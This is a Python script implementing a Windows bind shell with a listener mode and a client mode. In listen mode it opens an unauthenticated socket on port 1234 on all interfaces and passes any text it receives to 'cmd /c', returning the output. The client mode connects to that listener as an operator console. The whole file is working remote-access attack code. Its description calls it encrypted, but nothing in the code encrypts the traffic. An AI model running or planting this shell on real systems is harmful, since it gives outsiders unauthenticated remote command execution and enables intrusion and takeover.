import socket
import subprocess
import threading
import argparse

DEFAULT_PORT = 1234
MAX_BUFFER_SIZE = 4096

def execute_command(command):
    """Executes a system command using "cmd" and returns the output."""
    try:
        output = subprocess.check_output("cmd /c {}".format(command), stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = b"Command execution failed: " + e.output
    return output

def handle_client(client_socket):
    """Handles a shell session with a client."""
    client_socket.send(b"Connection established successfully\r\n")
    try:
        while True:
            client_socket.send(b"Please enter a command (type 'exit' to disconnect): ")
            data = client_socket.recv(MAX_BUFFER_SIZE)
            if data:
                command = data.decode("latin-1").strip()
                print("Received command from client: {}".format(command))
                if not command or command.lower() == "exit":
                    client_socket.send(b"Session terminated. Goodbye!\r\n")
                    client_socket.close()
                    break
                print("Executing command: {}".format(command))
                command_output = execute_command(command)
                client_socket.send(command_output + b"\r\n")
    except Exception as e:
        print(f"An error occurred while handling the client: {e}. Please try again.")
        client_socket.close()

def send_commands(client_socket):
    """Function to send commands to the remote shell."""
    try:
        while True:
            cmd = input("")  # Taking command input from user
            if cmd.strip().lower() == "exit":
                client_socket.close()
                break
            client_socket.send(cmd.encode("latin-1") + b"\n")
    except Exception as e:
        print(f"Disconnected from server: {e}")
        client_socket.close()

def receive_output(client_socket):
    """Function to receive output from the remote shell."""
    try:
        while True:
            output = client_socket.recv(MAX_BUFFER_SIZE).decode("latin-1")
            print(output, end="")
    except Exception as e:
        print(f"Disconnected from server: {e}")
        client_socket.close()

def server_mode():
    """Sets up a server that listens for incoming connections and spawns a shell thread."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', DEFAULT_PORT))
    server_socket.listen()
    print("Initializing bind shell. Listening for incoming connections...")
    while True:
        client_socket, addr = server_socket.accept()
        print("New connection established from: {}".format(addr))
        threading.Thread(target=handle_client, args=(client_socket,)).start()

def client_mode(ip_address):
    """Connects to a remote bind shell."""
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((ip_address, DEFAULT_PORT))
    print("Successfully connected to the remote bind shell. Type your commands below:")
    # Starting threads for sending commands and receiving output
    threading.Thread(target=send_commands, args=(client_socket,)).start()
    threading.Thread(target=receive_output, args=(client_socket,)).start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Encrypted Bind Shell Project")
    parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell")
    parser.add_argument("-c", "--connect", help="Connect to a bind shell")
    args = parser.parse_args()

    if args.listen:
        server_mode()
    elif args.connect:
        client_mode(args.connect)